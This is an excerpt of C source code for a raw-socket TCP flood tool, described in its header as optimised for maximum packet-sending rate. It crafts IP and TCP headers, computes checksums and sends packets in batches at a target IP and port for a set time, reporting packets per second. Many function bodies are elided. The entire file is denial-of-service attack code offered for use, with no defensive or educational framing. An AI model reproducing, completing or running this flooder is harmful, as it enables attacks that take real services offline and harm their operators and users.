/*
 * High Efficiency TCP Flood - Maximum Performance Version
 * Released under GNU GPL License v3.0
 * Optimized for maximum packet sending rate
 */
...
#define BATCH_SIZE 100 // Number of packets to send in a single batch
...
typedef struct {
    struct iphdr ip;
    struct tcphdr tcp;
    char buffer[MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct tcphdr)];
} Packet;
...
// Inline Xorshift random number generator for maximum speed
...
static inline uint16_t csum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
...
// Inline TCP checksum calculation
static inline uint16_t tcp_csum(struct iphdr *iph, struct tcphdr *tcph) {
...
// Inline IP header initialization
static inline void init_ip_header(struct iphdr *iph, in_addr_t saddr, in_addr_t daddr) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
...
// Inline TCP header initialization
static inline void init_tcp_header(struct tcphdr *tcph, uint16_t sport, uint16_t dport, Config *config) {
...
int main(int argc, char *argv[]) {
    ...
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size)) < 0) {
        fprintf(stderr, "Failed to set socket buffer size: %s\n", strerror(errno));
        close(sock);
        free(tcp_csum_buffer);
        return 1;
    }
    printf("Socket buffer size set to %d bytes\n", buffer_size);

    printf("Starting flood on %s:%d for %d seconds...\n", config.target_ip, config.target_port, config.duration);

    // High-performance packet sending loop with batching
    ...
    Packet packet_batch[BATCH_SIZE];
    ...
    while (time(NULL) < end_time) {
        ...
        // Send the batch
        for (int i = 0; i < BATCH_SIZE; i++) {
            int sent = sendto(sock, &packet_batch[i], sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
        ...
        if (packets_sent >= last_reported + 100000) {
    ...
    double total_time = (end_time_spec.tv_sec - start_time.tv_sec) +
                        (end_time_spec.tv_nsec - start_time.tv_nsec) / 1e9;
    double pps = total_time > 0 ? packets_sent / total_time : 0;
